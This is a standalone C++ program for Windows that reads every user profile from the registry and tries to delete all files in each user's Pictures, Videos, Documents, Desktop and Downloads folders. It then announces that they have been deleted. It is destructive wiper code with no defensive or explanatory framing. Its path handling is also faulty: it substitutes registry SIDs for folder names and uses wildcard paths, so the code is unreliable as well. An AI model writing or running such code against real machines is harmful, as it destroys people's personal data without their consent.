#include <iostream>
#include <filesystem>
#include <vector>
#include <windows.h>

namespace fs = std::filesystem;

void deleteAllFilesInDirectory(const fs::path& directory) {
    for (const auto& entry : fs::directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            fs::remove(entry.path());
        }
    }
}

void deleteAllFilesInSubdirectories(const fs::path& directory) {
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            fs::remove(entry.path());
        }
    }
}

int main() {
    std::vector<fs::path> directories = {
        "C:\\Users\\*\\Pictures",
        "C:\\Users\\*\\Videos",
        "C:\\Users\\*\\Documents",
        "C:\\Users\\*\\Desktop",
        "C:\\Users\\*\\Downloads"
    };

    // Get all user profiles
    std::vector<std::wstring> userProfiles;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD index = 0;
        wchar_t subKeyName[256];
        DWORD subKeyNameSize = sizeof(subKeyName) / sizeof(wchar_t);
        while (RegEnumKeyExW(hKey, index, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            userProfiles.push_back(subKeyName);
            subKeyNameSize = sizeof(subKeyName) / sizeof(wchar_t);
            index++;
        }
        RegCloseKey(hKey);
    }

    for (const auto& userProfile : userProfiles) {
        for (const auto& directory : directories) {
            fs::path userDirectory = directory;
            userDirectory.replace_filename(userProfile);
            deleteAllFilesInDirectory(userDirectory);
            deleteAllFilesInSubdirectories(userDirectory);
        }
    }

    std::cout << "All files in specified directories for all users have been deleted." << std::endl;
    return 0;
}
